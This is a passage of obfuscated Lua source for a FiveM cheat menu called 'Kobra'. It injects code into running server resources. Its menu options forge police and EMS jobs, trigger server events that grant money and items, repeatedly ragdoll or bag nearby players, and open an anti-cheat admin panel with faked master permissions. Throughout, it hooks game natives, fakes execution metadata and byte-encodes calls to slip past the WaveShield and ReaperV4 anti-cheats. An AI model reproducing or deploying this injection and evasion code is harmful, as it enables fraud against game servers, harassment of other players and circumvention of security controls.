                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);end});end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v97({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);elseif (GetResourceState("core")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="POLICE JOB (2)",onSelect=function() local v642=0;while true do if (v642==(0 -0)) then v12:Notify("Setjob","Kobra","You are now Police",7959 -4959 );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);break;end end end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v97({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v643) if v643 then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",5527 -(629 + 898) );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);else local v802=0 -0 ;while true do if (v802==0) then v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",10281 -6281 );v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);break;end end end end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v644) if v644 then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);else local v803=0;while true do if (v803==(365 -(12 + 353))) then print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Force Gang",onSelect=function() local v645="";local v646=1912 -(1680 + 231) ;v12:HideUI();v60("Gang Name","",function(v734) if (v734 and (v734~="")) then v645=v734;end end,"typeable");Wait(147 + 2153 );v60("Gang Rank","",function(v735) if (v735 and (v735~="")) then v646=tonumber(v735) or (1 + 0) ;end end,"typeable");Wait(1000);local v647=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;local v648=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v645,v646);v48(v647,v648);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",5149 -(212 + 937) );end});end if (GetResourceState("framework")=="started") then v97({type="button",label="Give Item #2",onSelect=function() v12:HideUI();local function v649(v736,v737) local v738=nil;local v739=false;v60(v736,v737 or "" ,function(v804) v738=v804;v739=true;end,"typeable");while  not v739 do Wait(0 + 0 );end return v738;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v650=v649("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v650));if ( not v650 or (v650=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",4062 -(111 + 951) );v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v651=v649("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v651));local v652=tonumber(v651);if ( not v652 or (v652<(1 + 0))) then local v805=0;while true do if (v805==(27 -(18 + 9))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v652=1;break;end end end if (v652>100000) then local v806=0 + 0 ;while true do if (v806==0) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v652=100534 -(31 + 503) ;break;end end end v650=tostring(v650 or "" );v652=tonumber(v652 or (1633 -(595 + 1037)) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v650);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v652);local v653,v654=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v650,v652));end);if  not v653 then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v654);v12:Notify("error","Kobra","String format failed — check console",5444 -(189 + 1255) );else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",1478 + 2522 );end v12:ShowUI();end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v97({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() local v655=0 -0 ;while true do if ((1279 -(1170 + 109))==v655) then print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);break;end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Set Chat Tag",onSelect=function() v12:HideUI();local function v656(v740,v741) local v742=0;local v743;local v744;while true do if ((1819 -(348 + 1469))==v742) then return v743;end if (v742==(1289 -(1115 + 174))) then v743=nil;v744=false;v742=2 -1 ;end if (v742==(1015 -(85 + 929))) then v60(v740,v741 or "" ,function(v1036) local v1037=0 + 0 ;while true do if ((1867 -(1151 + 716))==v1037) then v743=v1036;v744=true;break;end end end,"typeable");while  not v744 do Wait(0 + 0 );end v742=2 + 0 ;end end end local v657=v656("Chat Tag Name","");if ( not v657 or (v657=="")) then v12:ShowUI();return;end Wait(500);local v658=v656("Tag Color (R, G, B)","0, 255, 0");if ( not v658 or (v658=="")) then v658="255, 255, 255";end Wait(2204 -(95 + 1609) );local v659=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v659,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v657,v658));v12:ShowUI();end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="POLICE JOB (3)",onSelect=function() local v660=0 -0 ;while true do if ((758 -(364 + 394))==v660) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="EMS JOB (1)",onSelect=function() local v661=0;while true do if (v661==(0 + 0)) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("ElectronAC")=="started") then v97({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v97({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v60("Choose Menu Key","",function(v478) for v581,v582 in pairs(v44) do if (v582:lower()==v478:lower()) then local v745=0 + 0 ;while true do if (v745==(0 + 0)) then v23=v582;Wait(250);v745=1;end if ((1 + 0)==v745) then v12:ShowUI();return;end end end end end,"keybind");local v289=0 + 0 ;local v290=120;while true do Wait(0 + 0 );if v32 then local v662=v38[v39];if IsControlJustReleased(0,6 + 8 ) then v39=(v39% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));end if IsControlJustReleased(0,15) then v39=((v39-(2 + 0))% #v38) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));end if (v662=="Shoot Weapon") then local v807=0;while true do if (v807==(956 -(719 + 237))) then if IsDisabledControlJustPressed(0 -0 ,37 + 7 ) then local v1188=0;while true do if (v1188==(0 -0)) then v34=((v34-(5 -3))% #v36) + (2 -1) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end if IsDisabledControlJustPressed(0,2029 -(761 + 1230) ) then v34=(v34% #v36) + (194 -(80 + 113)) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end break;end end elseif (v662=="Spawn Car") then local v955=0 + 0 ;while true do if (v955==(0 + 0)) then if IsDisabledControlJustPressed(0,2 + 42 ) then v35=((v35-(7 -5))% #v37) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(0 + 0 ,38) then local v1248=0;while true do if ((0 + 0)==v1248) then v35=(v35% #v37) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end break;end end end if IsDisabledControlPressed(1243 -(965 + 278) ,1753 -(1391 + 338) ) then local v808=v662;if (v808=="Shoot Weapon") then local v956=v36[v34];if (v956=="WEAPON_PERMKILL") then v956="WEAPON_TRANQUILIZER";elseif (v956=="WEAPON_RPG_2") then v956="WEAPON_AIRSTRIKE_ROCKET";end if (v956~=v33) then v33=v956;print(("weapon: %s, LastWeaponFired: %s"):format(v956,v33));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1343=0 -0 ;local v1344;local v1345;local v1346;local v1347;local v1348;local v1349;local v1350;local v1351;local v1352;local v1353;while true do if ((2 + 0)==v1343) then hNative("SetCurrentPedWeapon",function(v1519,...) return v1519(...);end);hNative("GetCurrentPedWeapon",function(v1520,...) return v1520(...);end);hNative("RemoveWeaponFromPed",function(v1521,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1522,...) return v1522(...);end);v1343=6 -3 ;end if (v1343==(1 + 2)) then v1345=GetCamCoord(_G.KobraFreecamObject);v1346=GetCamRot(_G.KobraFreecamObject,1410 -(496 + 912) );v1347=v1344(v1346);v1348=1000;v1343=13 -9 ;end if (v1343==(2 + 4)) then ShootSingleBulletBetweenCoords(v1345.x,v1345.y,v1345.z,v1349.x,v1349.y,v1349.z,100,true,v1351,PlayerPedId(),true,false,189568 -89568 );break;end if (v1343==1) then hNative("Wait",function(v1523,...) return v1523(...);end);hNative("PlayerPedId",function(v1524,...) return v1524(...);end);hNative("GetHashKey",function(v1525,...) return v1525(...);end);hNative("GiveWeaponToPed",function(v1526,...) return v1526(...);end);v1343=1332 -(1190 + 140) ;end if ((0 + 0)==v1343) then v1344=nil;function v1344(v1527) local v1528=718 -(317 + 401) ;local v1529;local v1530;local v1531;while true do if ((949 -(303 + 646))==v1528) then v1529=math.rad(v1527.z);v1530=math.rad(v1527.x);v1528=3 -2 ;end if (1==v1528) then v1531=math.abs(math.cos(v1530));return vector3( -math.sin(v1529) * v1531 ,math.cos(v1529) * v1531 ,math.sin(v1530));end end end function hNative(v1532,v1533) local v1534=0;local v1535;while true do if (v1534==(1732 -(1675 + 57))) then v1535=_G[v1532];if ( not v1535 or (type(v1535)~="function")) then return;end v1534=1 + 0 ;end if (v1534==(2 -1)) then _G[v1532]=function(...) return v1533(v1535,...);end;break;end end end hNative("CreateThread",function(v1536,...) return v1536(...);end);v1343=1 + 0 ;end if (v1343==4) then v1349=v1345 + (v1347 * v1348) ;v1350=PlayerPedId();v1351=GetHashKey(v956);v1352=nil;v1343=982 -(338 + 639) ;end if (v1343==(384 -(320 + 59))) then function v1352(v1537) local v1538=0 + 0 ;local v1539;while true do if (v1538==0) then v1539={};for v1632=1, #v1537 do v1539[v1632]=string.byte(v1537,v1632);end v1538=733 -(628 + 104) ;end if (v1538==(1 -0)) then return table.concat(v1539,",");end end end v1353=v1352(v956);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1350,v1353));Wait(350);v1343=1897 -(439 + 1452) ;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v956   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1257=1947 -(105 + 1842) ;local v1258;local v1259;local v1260;local v1261;local v1262;local v1263;local v1264;local v1265;while true do if (v1257==(22 -17)) then v1263=v1259 + (v1261 * v1262) ;v1264=PlayerPedId();v1265=GetHashKey(v956);v1257=6;end if (v1257==4) then v1260=GetCamRot(_G.KobraFreecamObject,2);v1261=v1258(v1260);v1262=2439 -1439 ;v1257=24 -19 ;end if (v1257==(1 + 6)) then ShootSingleBulletBetweenCoords(v1259.x,v1259.y,v1259.z,v1263.x,v1263.y,v1263.z,100,true,v1265,v1264,true,false,171614 -71614 );break;end if (v1257==(2 + 1)) then hNative("GetCurrentPedWeapon",function(v1398,...) return v1398(...);end);hNative("RemoveWeaponFromPed",function(v1399,...) return;end);v1259=GetCamCoord(_G.KobraFreecamObject);v1257=1168 -(274 + 890) ;end if ((1 + 0)==v1257) then hNative("CreateThread",function(v1400,...) return v1400(...);end);hNative("Wait",function(v1401,...) return v1401(...);end);hNative("PlayerPedId",function(v1402,...) return v1402(...);end);v1257=2 + 0 ;end if (v1257==(2 + 4)) then GiveWeaponToPed(v1264,v1265,139 + 116 ,false,true);MachoInjectThread(0 + 0 ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1265   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(353 -103 );v1257=7;end if (v1257==(819 -(731 + 88))) then v1258=nil;function v1258(v1403) local v1404=math.rad(v1403.z);local v1405=math.rad(v1403.x);local v1406=math.abs(math.cos(v1405));return vector3( -math.sin(v1404) * v1406 ,math.cos(v1404) * v1406 ,math.sin(v1405));end function hNative(v1407,v1408) local v1409=0;local v1410;while true do if (v1409==(0 + 0)) then v1410=_G[v1407];if ( not v1410 or (type(v1410)~="function")) then return;end v1409=1;end if (v1409==1) then _G[v1407]=function(...) return v1408(v1410,...);end;break;end end end v1257=1;end if (v1257==(2 + 0)) then hNative("GetHashKey",function(v1411,...) return v1411(...);end);hNative("GiveWeaponToPed",function(v1412,...) return v1412(...);end);hNative("SetCurrentPedWeapon",function(v1413,...) return v1413(...);end);v1257=1 + 2 ;end end end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1354=0 -0 ;local v1355;local v1356;local v1357;local v1358;local v1359;local v1360;local v1361;local v1362;local v1363;local v1364;while true do if ((2 -1)==v1354) then hNative("CreateThread",function(v1540,...) return v1540(...);end);hNative("Wait",function(v1541,...) return v1541(...);end);hNative("PlayerPedId",function(v1542,...) return v1542(...);end);hNative("GetHashKey",function(v1543,...) return v1543(...);end);v1354=2;end if (v1354==(0 -0)) then print("UPP3R");v1355=nil;function v1355(v1544) local v1545=math.rad(v1544.z);local v1546=math.rad(v1544.x);local v1547=math.abs(math.cos(v1546));return vector3( -math.sin(v1545) * v1547 ,math.cos(v1545) * v1547 ,math.sin(v1546));end function hNative(v1548,v1549) local v1550=0;local v1551;while true do if (v1550==(1 -0)) then _G[v1548]=function(...) return v1549(v1551,...);end;break;end if (v1550==0) then v1551=_G[v1548];if ( not v1551 or (type(v1551)~="function")) then return;end v1550=1;end end end v1354=1 + 0 ;end if (v1354==2) then hNative("GiveWeaponToPed",function(v1552,...) return v1552(...);end);hNative("SetCurrentPedWeapon",function(v1553,...) return v1553(...);end);hNative("GetCurrentPedWeapon",function(v1554,...) return v1554(...);end);hNative("RemoveWeaponFromPed",function(v1555,...) return;end);v1354=1 + 2 ;end if (v1354==5) then v1363=nil;function v1363(v1556) local v1557={};for v1596=1 + 0 , #v1556 do v1557[v1596]=string.byte(v1556,v1596);end return table.concat(v1557,",");end v1364=v1363(v956);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
